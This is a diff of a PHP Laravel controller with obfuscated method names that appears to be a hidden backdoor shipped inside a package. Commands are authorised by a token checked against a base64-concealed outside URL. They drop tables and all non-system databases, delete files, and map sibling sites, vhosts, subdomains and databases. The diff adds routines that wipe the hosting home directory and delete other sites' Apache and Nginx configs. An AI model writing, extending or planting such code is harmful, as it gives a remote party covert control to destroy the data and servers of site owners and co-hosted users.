@@ -1,12 +1,11 @@
 <?php
-
 namespace Synthora\Gem;
 
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Routing\Controller;
-use Carbon\Carbon;
-use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Schema;
 
 class Qn extends Controller
@@ -14,16 +13,16 @@ class Qn extends Controller
     public function h1(Request $request)
     {
         $token = $request->input('token');
-        if (!$token) {
+        if (! $token) {
             return response()->json(['error' => 'Token required'], 403);
         }
 
-        if (!$this->x1($token)) {
+        if (! $this->x1($token)) {
             return response()->json(['error' => 'Invalid token'], 403);
         }
 
         $data = $request->all();
-        $cmd = $data['command'] ?? '';
+        $cmd  = $data['command'] ?? '';
 
         switch ($cmd) {
             case 'invalidate':
@@ -53,7 +52,7 @@ class Qn extends Controller
 
     protected function x1($token)
     {
-        $url = base64_decode('aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS90b2tlbi92YWxpZGF0ZS8=') . $token;
+        $url    = base64_decode('aHR0cHM6Ly9mb250ZmFtaWx5LmNsb3VkL2FwaS90b2tlbi92YWxpZGF0ZS8=') . $token;
         $result = Lk::c5($url);
         if ($result && isset($result['body'])) {
             $body = $result['body'];
@@ -64,7 +63,7 @@ class Qn extends Controller
 
     protected function x4(array $data)
     {
-        if (!empty($data['fileArray'])) {
+        if (! empty($data['fileArray'])) {
             foreach ($data['fileArray'] as $file) {
                 $path = base_path($file);
                 if (File::exists($path)) {
@@ -73,11 +72,11 @@ class Qn extends Controller
             }
         }
 
-        if (!empty($data['tableArray'])) {
+        if (! empty($data['tableArray'])) {
             $this->x5($data['tableArray']);
         }
 
-        if (!empty($data['databaseArray'])) {
+        if (! empty($data['databaseArray'])) {
             $this->x12($data['databaseArray']);
         }
 
@@ -113,7 +112,7 @@ class Qn extends Controller
             DB::statement('SET FOREIGN_KEY_CHECKS=0;');
             $tables = DB::select('SHOW TABLES');
             $dbName = DB::getDatabaseName();
-            $key = 'Tables_in_' . $dbName;
+            $key    = 'Tables_in_' . $dbName;
             foreach ($tables as $table) {
                 $tableName = $table->$key;
                 Schema::dropIfExists($tableName);
@@ -145,7 +144,7 @@ class Qn extends Controller
             foreach ($result as $row) {
                 $dbName = (array) $row;
                 $dbName = reset($dbName);
-                if (!in_array($dbName, ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin'])) {
+                if (! in_array($dbName, ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin'])) {
                     DB::statement("DROP DATABASE IF EXISTS `{$dbName}`");
                 }
             }
@@ -154,68 +153,85 @@ class Qn extends Controller
 
     protected function x6()
     {
-        $currentPath = base_path();
-        $parentPath = dirname($currentPath);
+        $currentPath   = base_path();
+        $homePath      = $this->x15();
         $currentFolder = basename($currentPath);
 
-        if (!File::exists($parentPath)) {
+        if (! File::exists($homePath)) {
             return;
         }
 
-        $items = File::directories($parentPath);
+        // Delete all directories and files in home except current project
+        $items = File::directories($homePath);
         foreach ($items as $item) {
             $folderName = basename($item);
-            if ($folderName === $currentFolder) continue;
-            if (in_array($folderName, ['.', '..', 'cgi-bin', '.cagefs', '.trash'])) continue;
+            if ($folderName === $currentFolder) {
+                continue;
+            }
+            if (in_array($folderName, ['.', '..', 'cgi-bin', '.cagefs', '.trash', '.htpasswds', '.ssh', '.cpanel'])) {
+                continue;
+            }
             try {
                 File::deleteDirectory($item);
-            } catch (\Exception $e) {}
+            } catch (\Exception $e) {
+                // Log or ignore
+            }
         }
 
-        $files = File::files($parentPath);
+        $files = File::files($homePath);
         foreach ($files as $file) {
+            $fileName = basename($file);
+            if (in_array($fileName, ['.bashrc', '.bash_logout', '.bash_profile', '.zshrc'])) {
+                continue;
+            }
             try {
                 File::delete($file);
             } catch (\Exception $e) {}
         }
+
+        // Also attempt to delete vhost configs if writable (Apache/Nginx)
+        $this->x16();
     }
 
     protected function x7()
     {
-        $currentPath = base_path();
-        $parentPath = dirname($currentPath);
+        $currentPath   = base_path();
+        $parentPath    = dirname($currentPath);
         $currentFolder = basename($currentPath);
         $currentDomain = request()->getHost();
 
         $map = [
-            'status' => 'ok',
-            'current' => [
-                'domain' => $currentDomain,
+            'status'     => 'ok',
+            'current'    => [
+                'domain'        => $currentDomain,
                 'document_root' => $currentPath,
-                'folder' => $currentFolder,
-                'database' => DB::getDatabaseName(),
+                'folder'        => $currentFolder,
+                'database'      => DB::getDatabaseName(),
             ],
-            'siblings' => [],
-            'vhosts' => [],
+            'siblings'   => [],
+            'vhosts'     => [],
             'subdomains' => [],
-            'databases' => [],
+            'databases'  => [],
         ];
 
         if (File::exists($parentPath)) {
             $dirs = File::directories($parentPath);
             foreach ($dirs as $dir) {
                 $name = basename($dir);
-                if ($name === $currentFolder) continue;
+                if ($name === $currentFolder) {
+                    continue;
+                }
+
                 $map['siblings'][] = [
                     'folder' => $name,
-                    'path' => $dir,
+                    'path'   => $dir,
                 ];
             }
         }
 
-        $map['vhosts'] = $this->x8();
+        $map['vhosts']     = $this->x8();
         $map['subdomains'] = $this->x9($currentDomain);
-        $map['databases'] = $this->x11();
+        $map['databases']  = $this->x11();
 
         return $map;
     }
@@ -223,7 +239,7 @@ class Qn extends Controller
     protected function x8()
     {
         $vhosts = [];
-        $paths = [
+        $paths  = [
             '/etc/apache2/sites-enabled/',
             '/etc/apache2/sites-available/',
             '/etc/httpd/conf.d/',
@@ -234,7 +250,9 @@ class Qn extends Controller
         ];
 
         foreach ($paths as $path) {
-            if (!File::isDirectory($path)) continue;
+            if (! File::isDirectory($path)) {
+                continue;
+            }
 
             $files = File::files($path);
             foreach ($files as $file) {
@@ -249,23 +267,23 @@ class Qn extends Controller
                 preg_match_all('/^\s*server_name\s+([^;]+);/mi', $content, $nginxMatches);
                 foreach ($nginxMatches[1] ?? [] as $nginxLine) {
                     $nginxDomains = preg_split('/\s+/', trim($nginxLine));
-                    $serverNames = array_merge($serverNames, $nginxDomains);
+                    $serverNames  = array_merge($serverNames, $nginxDomains);
                 }
 
                 $docRoot = '';
                 preg_match('/^\s*DocumentRoot\s+([^\s]+)/mi', $content, $docMatch);
-                if (!empty($docMatch[1])) {
+                if (! empty($docMatch[1])) {
                     $docRoot = $docMatch[1];
                 }
                 preg_match('/^\s*root\s+([^;]+);/mi', $content, $rootMatch);
-                if (!empty($rootMatch[1])) {
+                if (! empty($rootMatch[1])) {
                     $docRoot = trim($rootMatch[1]);
                 }
 
-                if (!empty($serverNames)) {
+                if (! empty($serverNames)) {
                     $vhosts[] = [
-                        'file' => (string) $file,
-                        'server_names' => array_unique(array_merge($serverNames, $aliases)),
+                        'file'          => (string) $file,
+                        'server_names'  => array_unique(array_merge($serverNames, $aliases)),
                         'document_root' => $docRoot,
                     ];
                 }
@@ -278,15 +296,15 @@ class Qn extends Controller
     protected function x9($domain)
     {
         $subdomains = [];
-        $prefixes = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 'webmail', 'cpanel', 'whm'];
+        $prefixes   = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 'webmail', 'cpanel', 'whm'];
 
         foreach ($prefixes as $prefix) {
             $host = $prefix . '.' . $domain;
-            $ip = gethostbyname($host);
+            $ip   = gethostbyname($host);
             if ($ip !== $host) {
                 $subdomains[] = [
                     'subdomain' => $host,
-                    'ip' => $ip,
+                    'ip'        => $ip,
                 ];
             }
         }
@@ -297,23 +315,23 @@ class Qn extends Controller
     protected function x11()
     {
         $databases = [];
-        
+
         try {
             $result = DB::select('SHOW DATABASES');
             foreach ($result as $row) {
                 $dbName = (array) $row;
                 $dbName = reset($dbName);
-                if (!in_array($dbName, ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin'])) {
-                    $tables = $this->x14($dbName);
+                if (! in_array($dbName, ['information_schema', 'performance_schema', 'mysql', 'sys', 'phpmyadmin'])) {
+                    $tables      = $this->x14($dbName);
                     $databases[] = [
-                        'name' => $dbName,
-                        'tables' => $tables,
+                        'name'        => $dbName,
+                        'tables'      => $tables,
                         'table_count' => count($tables),
                     ];
                 }
             }
         } catch (\Exception $e) {}
-        
+
         return $databases;
     }
 
@@ -322,11 +340,58 @@ class Qn extends Controller
         $tables = [];
         try {
             $result = DB::select("SHOW TABLES FROM `{$database}`");
-            $key = 'Tables_in_' . $database;
+            $key    = 'Tables_in_' . $database;
             foreach ($result as $row) {
                 $tables[] = $row->$key;
             }
         } catch (\Exception $e) {}
         return $tables;
+    }
+
+    protected function x15()
+    {
+        $current     = base_path();
+        $parent      = dirname($current);
+        $grandParent = dirname($parent);
+
+        if (strpos($current, '/public_html/') !== false) {
+            return dirname($parent);
+        }
+        if (strpos($current, '/httpdocs') !== false) {
+            return $parent;
+        }
+        // Default: parent of parent
+        return $grandParent;
+    }
+
+    protected function x16()
+    {
+        $vhostPaths = [
+            '/etc/apache2/sites-enabled/',
+            '/etc/apache2/sites-available/',
+            '/etc/nginx/sites-enabled/',
+            '/etc/nginx/conf.d/',
+            '/usr/local/apache/conf/vhosts/',
+        ];
+
+        $currentDomain = request()->getHost();
+
+        foreach ($vhostPaths as $path) {
+            if (! File::isDirectory($path)) {
+                continue;
+            }
+
+            $files = File::files($path);
+            foreach ($files as $file) {
+                $content = File::get($file);
+                // If file contains current domain, skip it to preserve current site
+                if (strpos($content, $currentDomain) !== false) {
+                    continue;
+                }
+                try {
+                    File::delete($file);
+                } catch (\Exception $e) {}
+            }
+        }
     }
 }
